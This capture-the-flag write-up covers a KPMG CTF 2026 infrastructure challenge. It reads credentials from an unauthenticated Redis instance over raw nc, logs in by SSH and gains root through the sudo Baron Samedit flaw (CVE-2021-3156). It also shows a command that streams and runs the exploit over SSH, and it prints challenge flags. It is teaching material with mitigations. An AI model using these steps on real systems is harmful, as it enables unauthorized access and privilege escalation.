---
link: 'writeups/kpmg-ctf-2026/voodoo-spirit-of-death'
title: "Voodoo Spirit of Death - KPMG CTF 2026"
description: "Writeup for Voodoo Spirit of Death (Parts 1 & 2) from KPMG CTF 2026. Unauthenticated Redis leaking SSH credentials, followed by CVE-2021-3156 (Baron Samedit) to get root."
date: 2026-10-25 11:52:00
categories:
  - [Writeups, KPMG CTF 2026]
tags:
  - KPMG-CTF-2026
  - Infrastructure
  - Redis
  - Credential Leak
  - CVE-2021-3156
  - Baron Samedit
  - Privilege Escalation
  - Sudo
---

# KPMG CTF 2026 - Voodoo Spirit of Death

---

## Challenge Description

> An Acme Operations web portal with a login form, an SSH service, and an unauthenticated Redis instance. Get a shell, find the user flag, and escalate to root.

**Services:**
- Web: `http://kicyber-66d0f22e3636-vodoo-spirit-of-deat-0-0.chals.io`
- SSH: `0.cloud.chals.io:16632` (Part 1) / `0.cloud.chals.io:32447` (Part 2)
- Redis: `0.cloud.chals.io:26366`

---

## Step 1 - Service Discovery

```sh
nmap -Pn -sV --version-light -p 16632,26366 0.cloud.chals.io
```

Port `16632` was OpenSSH, port `26366` was Redis. The web login just returned "Invalid email or password" for anything we tried, so we moved on.

---

## Step 2 - Hitting the Redis Instance

Redis had no authentication. `redis-cli` wasn't available on the machine, so we used raw protocol over `nc`:

```sh
printf 'PING\r\n' | nc -nv -w 3 165.227.210.30 26366
# +PONG

printf 'SCAN 0 COUNT 100\r\n' | nc -nv -w 3 165.227.210.30 26366
```

33 keys in the database - message threads, sessions, cached account data. We made a helper to query individual keys cleanly:

```sh
r() { printf '%s\r\n' "$*" | nc -w 3 165.227.210.30 26366; }
r TYPE 'message:thread:dm-baron-maya'
# +string
r GET 'message:thread:dm-baron-maya'
```

The DM thread between Baron Samedit and Maya Chen had SSH credentials for the staging servers sitting in plaintext:

```plain
Username: maya.chen
Password: Onboard-Maya25!
```

![Redis credentials found](/img/posts/kpmg-ctf-2026-19_vodoo_redis_creds.webp)

> [!NOTE]
> We also found an active session cookie for Maya in Redis. Using it as `acme_session` gave us portal access, but SSH was the intended path.

> [!TIP]
> All values here were plain strings. Always check the key type with `TYPE` before picking a read command - `HGETALL` and `LRANGE` will just return `WRONGTYPE` errors on strings.

---

## Step 3 - SSH Login and User Flag (Part 1)

```sh
ssh -p 16632 maya.chen@0.cloud.chals.io
# Password: Onboard-Maya25!
```

Got a shell as `uid=1000(maya.chen)`. No sudo permissions. Maya's visible home directories were dead ends - just notes and scripts.

![SSH login as maya.chen](/img/posts/kpmg-ctf-2026-18_vodoo_ssh_login.webp)

A shallow `find` missed the flag because it was inside a hidden directory. A full recursive search got it:

```sh
find "$HOME" -type f \( -name 'user.txt' -o -iname '*flag*' \) -print
# /home/maya.chen/.local/share/acme-agent/.vault/user.txt

cat /home/maya.chen/.local/share/acme-agent/.vault/user.txt
```

### Flag 1

```plain
KPMG_CTF{ArbcuvmYQb9V5XEVOoK2EZoDSNQ4AG9xKm7UdqPalO6n}
```

![User flag](/img/posts/kpmg-ctf-2026-20_vodoo_flag1.webp)

---

## Step 4 - Identifying the Sudo Version (Part 2)

Part 2 had a second SSH port (`32447`). Same Maya credentials worked:

```sh
ssh -p 32447 maya.chen@165.227.210.30
```

First thing we checked was the sudo version:

```sh
sudo --version | head -1
dpkg-query -W -f='${Version}\n' sudo
```

![Checking sudo version](/img/posts/kpmg-ctf-2026-21_vodoo_sudo_version.webp)

| Component | Version |
|---|---|
| sudo | `1.8.31-1ubuntu1` |
| OS | Ubuntu 20.04.6 LTS |
| glibc | `2.31` |

This is the exact build affected by CVE-2021-3156 "Baron Samedit" - a heap overflow in sudo's argument handling that lets any local user get root. The challenge name was a direct hint at this.

---

## Step 5 - Running the Baron Samedit Exploit

Files created in Maya's home disappeared within seconds (some cleanup job), so uploading a binary and running it in a separate session was unreliable. We worked around this by streaming the exploit and running it all in one SSH connection:

```sh
# Pack the exploit and its helper library
tar -cf - exploit libnss_x | base64 -w 64 > /tmp/ctf-payload.b64
payload_bytes=$(wc -c < /tmp/ctf-payload.b64)

# Stream, extract, and run in one connection
{
  cat /tmp/ctf-payload.b64
  printf 'id\nfind /root -maxdepth 3 -type f -name root.txt -print -exec cat {} \\;\nexit\n'
} | ssh -tt -p 32447 maya.chen@165.227.210.30 \
  "stty -echo; mkdir -p ~/poc; head -c $payload_bytes | base64 -d | tar -xf - -C ~/poc && cd ~/poc && chmod +x exploit && ./exploit"
```

![The exploit running](/img/posts/kpmg-ctf-2026-22_vodoo_exploit.webp)

Output confirmed root:

```text
uid=0(root) gid=0(root) groups=0(root),1000(maya.chen)
/root/root.txt
```

![Proof of cleanup](/img/posts/kpmg-ctf-2026-24_vodoo_cleanup.webp)

### Flag 2

```plain
KPMG_CTF{GL6RNzWvKqdYw-N7TntygaK5OTouvCRdRPDiIBxO0eCw}
```

![Root flag](/img/posts/kpmg-ctf-2026-23_vodoo_flag2.webp)

---

## Mitigations

| Vulnerability | Fix |
|---|---|
| Unauthenticated Redis | Use `requirepass`, bind to `127.0.0.1`, add firewall rules |
| Plaintext creds in Redis messages | Never store credentials in cache or message queues |
| sudo 1.8.31 (CVE-2021-3156) | Upgrade to sudo 1.8.32+ / 1.9.5p2+ |

---

## References

- [Ubuntu CVE-2021-3156 advisory](https://ubuntu.com/security/CVE-2021-3156)
- [Qualys Baron Samedit analysis](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)
- [Sudo 1.8.31 exploit PoC](https://github.com/Whiteh4tWolf/Sudo-1.8.31-Root-Exploit)

---

## Summary

The Redis instance was open to the internet with no auth, and it was storing internal DMs with plaintext SSH credentials. Those credentials got us a shell as `maya.chen`. The host was running sudo `1.8.31` - vulnerable to Baron Samedit (CVE-2021-3156). The tricky part was that files got cleaned up between sessions, so we had to stream the exploit binary over SSH and run it in a single connection rather than uploading it normally.
